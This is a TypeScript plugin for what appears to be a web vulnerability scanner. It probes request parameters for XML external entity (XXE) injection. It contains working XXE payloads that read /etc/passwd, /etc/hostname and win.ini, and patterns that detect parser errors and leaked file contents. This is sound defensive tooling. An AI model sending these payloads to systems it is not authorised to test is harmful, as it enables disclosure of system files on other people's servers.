import { SignatureGroupId } from "../../types/branded.ts";
import type { Evidence, Exchange } from "../../types/models.ts";
import { BuiltinMutationType, BuiltinPayload } from "../../types/models.ts";
import type { RunAuditContext } from "../../commands/run-audit.ts";
import { MutationFilteredSignaturePlugin } from "./mutation-filtered.ts";

export const XXE_ERROR_PATTERNS: RegExp[] = [
  /SAXParseException/i,
  /SAXParser.*exception/i,
  /XML parser.*error/i,
  /XML Parsing Error/i,
  /org\.xml\.sax/i,
  /javax\.xml\.parsers/i,
  /System\.Xml\.XmlException/i,
  /libxml2.*error/i,
  /XML_E_INVALID/i,
  /not well-formed/i,
  /entity.*not defined/i,
  /External entity.*not allowed/i,
];

/** Patterns indicating successful file content disclosure via XXE */
export const XXE_FILE_CONTENT_PATTERNS: RegExp[] = [
  /root:.*:0:0:/,
  /daemon:.*:\/usr\/sbin:/,
  /nobody:.*:\/nonexistent:/,
  /\[fonts\]/i,
  /for\s+16-bit\s+app\s+support/i,
];

export const XXE_PAYLOADS: string[] = [
  // Classic XXE - /etc/passwd read
  `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>`,
  // XXE - /etc/hostname read (shorter, less likely to be truncated)
  `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<foo>&xxe;</foo>`,
  // XXE - Windows variant
  `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
<foo>&xxe;</foo>`,
  // XXE via parameter entity
  `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
]>
<foo>test</foo>`,
];

export default class XxeInjectionPlugin extends MutationFilteredSignaturePlugin {
  readonly name = "signature:xxe-injection";
  protected readonly groups = [SignatureGroupId("xxe-injection")];
  protected readonly mutationTypes = [
    BuiltinMutationType.ReplaceValue,
  ] as const;

  protected async runAudit({ parameter, replay }: RunAuditContext) {
    const allExchanges: Exchange[] = [];
    const evidenceExchanges: Exchange[] = [];

    for (const xmlPayload of XXE_PAYLOADS) {
      const payload = BuiltinPayload.String(xmlPayload);
      const instruction = parameter.createMutation(
        payload,
        BuiltinMutationType.ReplaceValue,
      );
      const result = await replay([instruction]);
      allExchanges.push(...result.allExchanges);

      const body = result.exchange.response.body?.toString() ?? "";
      const statusCode = result.exchange.response.statusCode;

      // Check for XXE error patterns
      const hasError = XXE_ERROR_PATTERNS.some((p) => p.test(body));
      if (hasError) {
        evidenceExchanges.push(result.exchange);
        break;
      }

      // Check for file content disclosure indicators
      const hasFileContent = XXE_FILE_CONTENT_PATTERNS.some((p) => p.test(body));
      if (hasFileContent) {
        evidenceExchanges.push(result.exchange);
        break;
      }

      // Check for successful entity expansion returning file contents
      if (
        (statusCode === 200 || statusCode === 500) &&
        (body.includes("root:") || body.includes("daemon:") || body.includes("nobody:"))
      ) {
        evidenceExchanges.push(result.exchange);
        break;
      }
    }

    const evidence: Evidence = {
      judgmentId: "xxe-error-pattern",
      exchanges: allExchanges,
      evidenceExchanges,
    };
    return {
      vulnerable: evidenceExchanges.length > 0,
      evidence,
      request: allExchanges[0]?.request ?? {
        method: "GET",
        url: "",
        headers: {},
        body: null,
      },
      response: allExchanges[0]?.response ?? {
        statusCode: 0,
        headers: {},
        body: null,
      },
    };
  }
}
